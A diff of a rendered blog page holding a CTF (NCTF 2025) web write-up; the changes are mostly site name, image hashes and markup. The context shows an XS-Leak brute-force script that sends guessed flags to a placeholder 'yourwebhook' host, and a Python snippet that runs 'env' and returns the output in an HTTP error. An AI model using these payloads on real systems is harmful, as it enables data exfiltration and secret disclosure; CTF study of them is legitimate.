@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 &lt;script&gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = &#34;http://127.0.0.1:8000/internal/search?s=&#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(&#39;script&#39;) // 创建&lt;script&gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =&gt; { // 脚本加载成功时触发 fetch(&#34;http://yourwebhook/?flag=&#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =&gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = &#39;abcdefghijklmnopqrstuvwxyz0123456789-}&#39; // 猜测字符范围（包含闭合符}） let flag = &#39;flag{&#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i &lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } &lt;/script&gt; 每次运行爆出一位，然后手动在let flag = &lsquo;flag{&lsquo;后加上即可\n">
 <title>2025-nctf-web</title>
@@ -9,7 +9,7 @@
 <link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-nctf-web">
 <meta property='og:description' content="web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 &lt;script&gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = &#34;http://127.0.0.1:8000/internal/search?s=&#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(&#39;script&#39;) // 创建&lt;script&gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =&gt; { // 脚本加载成功时触发 fetch(&#34;http://yourwebhook/?flag=&#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =&gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = &#39;abcdefghijklmnopqrstuvwxyz0123456789-}&#39; // 猜测字符范围（包含闭合符}） let flag = &#39;flag{&#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i &lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } &lt;/script&gt; 每次运行爆出一位，然后手动在let flag = &lsquo;flag{&lsquo;后加上即可\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-nctf-web/'>
-<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:site_name' content='zhizuijimi'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emoji' /><meta property='article:published_time' content='2025-03-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-26T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-nctf-web">
 <meta name="twitter:description" content="web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 &lt;script&gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = &#34;http://127.0.0.1:8000/internal/search?s=&#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(&#39;script&#39;) // 创建&lt;script&gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =&gt; { // 脚本加载成功时触发 fetch(&#34;http://yourwebhook/?flag=&#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =&gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = &#39;abcdefghijklmnopqrstuvwxyz0123456789-}&#39; // 猜测字符范围（包含闭合符}） let flag = &#39;flag{&#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i &lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } &lt;/script&gt; 每次运行爆出一位，然后手动在let flag = &lsquo;flag{&lsquo;后加上即可\n">
@@ -58,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -71,7 +71,7 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
             <h2 class="site-description"></h2>
         </div>
     </header><ol class="menu-social">
@@ -406,27 +406,27 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">checkError</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// 定义函数，参数应为尝试的新flag（但被错误覆盖）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:8000/internal/search?s=&#34;</span> <span class="o">+</span> <span class="nx">flag</span><span class="p">;</span>  <span class="c1">// 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">let</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">)</span>  <span class="c1">// 创建&lt;script&gt;标签用于发起请求
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="kc">false</span>  <span class="c1">// 🚨未使用的变量
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span>  <span class="c1">// 设置脚本地址（实际为固定地址，无法测试新字符）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">script</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>  <span class="c1">// 脚本加载成功时触发
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;http://yourwebhook/?flag=&#34;</span> <span class="o">+</span> <span class="nx">flag</span><span class="p">)</span>  <span class="c1">// 发送当前全局flag到攻击者服务器（但全局flag从未更新）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:8000/internal/search?s=&#34;</span> <span class="o">+</span> <span class="nx">flag</span><span class="p">;</span>  <span class="c1">// 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值
+</span></span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">)</span>  <span class="c1">// 创建&lt;script&gt;标签用于发起请求
+</span></span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="kc">false</span>  <span class="c1">// 🚨未使用的变量
+</span></span></span><span class="line"><span class="cl">        <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span>  <span class="c1">// 设置脚本地址（实际为固定地址，无法测试新字符）
+</span></span></span><span class="line"><span class="cl">        <span class="nx">script</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>  <span class="c1">// 脚本加载成功时触发
+</span></span></span><span class="line"><span class="cl">            <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;http://yourwebhook/?flag=&#34;</span> <span class="o">+</span> <span class="nx">flag</span><span class="p">)</span>  <span class="c1">// 发送当前全局flag到攻击者服务器（但全局flag从未更新）
+</span></span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="nx">script</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{}</span>  <span class="c1">// 加载失败不处理（未利用错误信息）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">)</span>  <span class="c1">// 插入脚本以触发请求
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">)</span>  <span class="c1">// 插入脚本以触发请求
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="c1">// 定义字符集和已知flag前缀
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">charset</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789-}&#39;</span>  <span class="c1">// 猜测字符范围（包含闭合符}）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="s1">&#39;flag{&#39;</span>  <span class="c1">// Flag的通用开头（CTF常见格式）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">charset</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789-}&#39;</span>  <span class="c1">// 猜测字符范围（包含闭合符}）
+</span></span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="s1">&#39;flag{&#39;</span>  <span class="c1">// Flag的通用开头（CTF常见格式）
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1">// 主爆破循环
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">charset</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// 遍历字符集
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">charset</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>  <span class="c1">// 获取当前尝试的字符
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">let</span> <span class="nx">newFlag</span> <span class="o">=</span> <span class="nx">flag</span> <span class="o">+</span> <span class="nx">c</span>  <span class="c1">// 组合新flag（如flag{a）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">checkError</span><span class="p">(</span><span class="nx">newFlag</span><span class="p">)</span>  <span class="c1">// 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">charset</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// 遍历字符集
+</span></span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">charset</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>  <span class="c1">// 获取当前尝试的字符
+</span></span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">newFlag</span> <span class="o">=</span> <span class="nx">flag</span> <span class="o">+</span> <span class="nx">c</span>  <span class="c1">// 组合新flag（如flag{a）
+</span></span></span><span class="line"><span class="cl">        <span class="nx">checkError</span><span class="p">(</span><span class="nx">newFlag</span><span class="p">)</span>  <span class="c1">// 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -533,7 +533,7 @@
 <p><img src="/p/2025-nctf-web/image-20250326000155616.png"
 	width="1899"
 	height="477"
-	srcset="/p/2025-nctf-web/image-20250326000155616_hu_966197563ccef382.png 480w, /p/2025-nctf-web/image-20250326000155616_hu_a83abe566cd3ed8c.png 1024w"
+	srcset="/p/2025-nctf-web/image-20250326000155616_hu_79b95cf775ad83c5.png 480w, /p/2025-nctf-web/image-20250326000155616_hu_fe7aa22a17558621.png 1024w"
 	loading="lazy"
 	
 	
@@ -693,7 +693,7 @@
 <p><img src="/p/2025-nctf-web/image-20250327221517012.png"
 	width="933"
 	height="284"
-	srcset="/p/2025-nctf-web/image-20250327221517012_hu_b162746b9864970a.png 480w, /p/2025-nctf-web/image-20250327221517012_hu_d6e436a5086d462f.png 1024w"
+	srcset="/p/2025-nctf-web/image-20250327221517012_hu_f2771ff9cd8a88f.png 480w, /p/2025-nctf-web/image-20250327221517012_hu_3b5285eea7054a7b.png 1024w"
 	loading="lazy"
 	
 	
@@ -705,7 +705,7 @@
 <p><img src="/p/2025-nctf-web/image-20250327221243276.png"
 	width="1263"
 	height="379"
-	srcset="/p/2025-nctf-web/image-20250327221243276_hu_3379ef8b09a87cdf.png 480w, /p/2025-nctf-web/image-20250327221243276_hu_8a41e623b03bdcf6.png 1024w"
+	srcset="/p/2025-nctf-web/image-20250327221243276_hu_60031cd329e14485.png 480w, /p/2025-nctf-web/image-20250327221243276_hu_96c0d40b66fa7fb0.png 1024w"
 	loading="lazy"
 	
 	
@@ -740,22 +740,22 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># 从bottle库中导入abort函数，用于发送HTTP错误响应
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">from</span> <span class="nx">bottle</span> <span class="nx">import</span> <span class="nx">abort</span>
+</span></span></span><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">bottle</span> <span class="nx">import</span> <span class="nx">abort</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 从subprocess库中导入getoutput函数，用于执行系统命令并获取输出
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">from</span> <span class="nx">subprocess</span> <span class="nx">import</span> <span class="nx">getoutput</span>
+</span></span></span><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">subprocess</span> <span class="nx">import</span> <span class="nx">getoutput</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 执行系统命令&#34;env&#34;，该命令用于列出当前环境变量，并将输出存储在变量a中
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">a</span> <span class="o">=</span> <span class="nx">getoutput</span><span class="p">(</span><span class="s2">&#34;env&#34;</span><span class="p">)</span>
+</span></span></span><span class="line"><span class="cl"><span class="nx">a</span> <span class="o">=</span> <span class="nx">getoutput</span><span class="p">(</span><span class="s2">&#34;env&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 使用abort函数发送一个404 HTTP错误响应，并将环境变量的输出作为错误消息返回
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span>
+</span></span></span><span class="line"><span class="cl"><span class="nx">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="/p/2025-nctf-web/image-20250327225045622.png"
 	width="1252"
 	height="635"
-	srcset="/p/2025-nctf-web/image-20250327225045622_hu_4637e929c0b469aa.png 480w, /p/2025-nctf-web/image-20250327225045622_hu_691aa9431d5ba8cc.png 1024w"
+	srcset="/p/2025-nctf-web/image-20250327225045622_hu_cf179eadf687835e.png 480w, /p/2025-nctf-web/image-20250327225045622_hu_2d0fa108422aadc4.png 1024w"
 	loading="lazy"
 	
 	
@@ -1094,7 +1094,7 @@
 <p><img src="/p/2025-nctf-web/image-20250328003344129.png"
 	width="969"
 	height="428"
-	srcset="/p/2025-nctf-web/image-20250328003344129_hu_410f3323dec1691b.png 480w, /p/2025-nctf-web/image-20250328003344129_hu_493efa33bf521663.png 1024w"
+	srcset="/p/2025-nctf-web/image-20250328003344129_hu_f225ad585fc250f6.png 480w, /p/2025-nctf-web/image-20250328003344129_hu_3aa5db4ea7a33420.png 1024w"
 	loading="lazy"
 	
 	
@@ -1120,7 +1120,7 @@
 </div><p><img src="/p/2025-nctf-web/image-20250328003646832.png"
 	width="833"
 	height="433"
-	srcset="/p/2025-nctf-web/image-20250328003646832_hu_6bac5fbfda8abc94.png 480w, /p/2025-nctf-web/image-20250328003646832_hu_4641811e523e3919.png 1024w"
+	srcset="/p/2025-nctf-web/image-20250328003646832_hu_5884f7e465776153.png 480w, /p/2025-nctf-web/image-20250328003646832_hu_45e9e5c0c5e6862a.png 1024w"
 	loading="lazy"
 	
 	
@@ -1132,7 +1132,7 @@
 <p><img src="/p/2025-nctf-web/image-20250328003956670.png"
 	width="1250"
 	height="405"
-	srcset="/p/2025-nctf-web/image-20250328003956670_hu_f33a7e88580ae309.png 480w, /p/2025-nctf-web/image-20250328003956670_hu_6ccec5e6bb859ad7.png 1024w"
+	srcset="/p/2025-nctf-web/image-20250328003956670_hu_adc989000490d281.png 480w, /p/2025-nctf-web/image-20250328003956670_hu_2ff6db837641cd3a.png 1024w"
 	loading="lazy"
 	
 	
@@ -1305,7 +1305,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 luokaihong
+            2025 - 
+        
+        2026 luokaihong
     </section>
     
     <section class="powerby">
